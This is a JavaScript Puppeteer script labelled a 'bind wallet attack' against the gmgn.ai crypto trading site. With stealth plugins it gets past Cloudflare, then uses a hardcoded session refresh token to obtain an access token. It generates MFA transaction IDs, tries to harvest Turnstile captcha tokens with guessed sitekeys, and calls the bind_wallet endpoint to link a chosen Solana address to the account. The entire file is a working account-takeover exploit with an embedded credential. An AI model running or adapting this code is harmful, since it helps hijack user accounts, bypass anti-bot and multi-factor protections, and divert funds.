/**
 * FINAL BIND_WALLET ATTACK
 * Browser passes Cloudflare, turnstile exists on page
 * Need to render widget and get token
 */
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ";
const TARGET = "5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU";
const PARAMS = "device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_web_20260715-2161-18d5b10&app_ver=20260715-2161-18d5b10&from_app=gmgn";

async function main() {
    console.log("🔥 FINAL BIND_WALLET ATTACK WITH TURNSTILE SOLVE");
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    });

    const page = await browser.newPage();
    await page.setViewport({ width: 1920, height: 1080 });
    
    // Navigate and pass Cloudflare
    console.log("[1] Loading gmgn.ai...");
    await page.goto('https://gmgn.ai', { waitUntil: 'networkidle2', timeout: 30000 });
    await new Promise(r => setTimeout(r, 3000));
    console.log(`    Title: ${await page.title()}`);

    // Do EVERYTHING in one evaluate call to avoid token expiry
    console.log("[2] Executing full attack chain in browser context...");
    
    const result = await page.evaluate(async (refresh, target, params) => {
        const log = [];
        
        // Step 1: Get access token
        log.push("Getting access token...");
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: "Token refresh failed", data, log};
        
        const token = data.data.data.token;
        log.push("✅ Got token");
        
        const headers = {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        };
        
        // Step 2: Generate bind_wallet txn_id
        log.push("Generating bind_wallet txn_id...");
        r = await fetch(`/account/account/generate_mfa_params?${params}`, {
            method: 'POST', headers,
            body: JSON.stringify({
                usage: 'bind_wallet',
                biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}
            })
        });
        data = await r.json();
        if (data.code !== 0) return {error: "MFA gen failed", data, log};
        
        const txnId = data.data.data.txn_id;
        const verifyItems = data.data.data.verify_items;
        log.push(`✅ txn_id: ${txnId}`);
        log.push(`verify_items: ${JSON.stringify(verifyItems)}`);
        
        // Step 3: Get Turnstile token
        log.push("Getting Turnstile token...");
        
        let captchaToken = null;
        
        // Check if turnstile is available
        if (window.turnstile) {
            log.push("window.turnstile found!");
            
            // Find existing sitekey from page
            const existingWidgets = document.querySelectorAll('[data-sitekey]');
            let siteKey = null;
            
            if (existingWidgets.length > 0) {
                siteKey = existingWidgets[0].getAttribute('data-sitekey');
                log.push(`Found sitekey: ${siteKey}`);
            }
            
            // Try to find sitekey from gmgn's config
            if (!siteKey) {
                // Common gmgn.ai turnstile sitekeys (from their JS bundle)
                const possibleKeys = [
                    '0x4AAAAAAADnPIDROrmt1Wwj',  // Common CF key
                    '0x4AAAAAAACkg61epSTpM7ad',  // Another common one
                ];
                
                for (const key of possibleKeys) {
                    try {
                        const container = document.createElement('div');
                        container.id = `cf-test-${Date.now()}`;
                        document.body.appendChild(container);
                        
                        const widgetId = window.turnstile.render(`#${container.id}`, {
                            sitekey: key,
                            callback: (t) => { captchaToken = t; },
                            'error-callback': () => {},
                        });
                        
                        log.push(`Rendered turnstile with key: ${key}, widget: ${widgetId}`);
                        
                        // Wait for token
                        for (let i = 0; i < 20; i++) {
                            await new Promise(r => setTimeout(r, 500));
                            if (captchaToken) break;
                            const resp = window.turnstile.getResponse(widgetId);
                            if (resp) { captchaToken = resp; break; }
                        }
                        
                        if (captchaToken) {
                            log.push(`💀 GOT CAPTCHA TOKEN: ${captchaToken.substring(0, 40)}...`);
                            break;
                        }
                        
                        container.remove();
                    } catch(e) {
                        log.push(`Key ${key} failed: ${e.message}`);
                    }
                }
            }
        } else {
            log.push("No window.turnstile - trying to load it");
        }
        
        if (!captchaToken) {
            // Try to solve without captcha - just call bind_wallet
            log.push("No captcha token obtained, trying bind directly...");
            
            r = await fetch(`/account/bind_wallet?${params}`, {
                method: 'POST', headers,
                body: JSON.stringify({
                    address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId
                })
            });
            data = await r.json();
            log.push(`Direct bind: code=${data.code} msg='${data.message}'`);
            
            return {
                success: data.code === 0,
                txnId,
                bindResult: data,
                captchaToken: null,
                log
            };
        }
        
        // Step 4: Verify captcha
        log.push("Verifying captcha...");
        r = await fetch(`/account/mfa/txn/v1/verify_captcha?${params}`, {
            method: 'POST', headers,
            body: JSON.stringify({
                txn_id: txnId,
                usage: 'bind_wallet',
                captcha_data: captchaToken,
                request_id: crypto.randomUUID()
            })
        });
        const captchaResult = await r.json();
        log.push(`Captcha verify: code=${captchaResult.code} msg='${captchaResult.message}'`);
        
        if (captchaResult.code === 0) {
            log.push("💀💀💀 CAPTCHA VERIFIED!");
            
            // Step 5: Try bind_wallet (email OTP still needed but let's see)
            r = await fetch(`/account/bind_wallet?${params}`, {
                method: 'POST', headers,
                body: JSON.stringify({
                    address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId
                })
            });
            data = await r.json();
            log.push(`Bind after captcha: code=${data.code} msg='${data.message}'`);
            
            return {
                success: data.code === 0,
                txnId,
                captchaVerified: true,
                bindResult: data,
                captchaToken: captchaToken.substring(0, 50),
                log
            };
        }
        
        return {
            success: false,
            txnId,
            captchaToken: captchaToken ? captchaToken.substring(0, 50) : null,
            captchaResult,
            log
        };
        
    }, FRESH_REFRESH, TARGET, PARAMS);
    
    console.log("\n" + "=".repeat(80));
    console.log("RESULT:");
    console.log("=".repeat(80));
    console.log(JSON.stringify(result, null, 2));
    
    await browser.close();
}

main().catch(console.error);
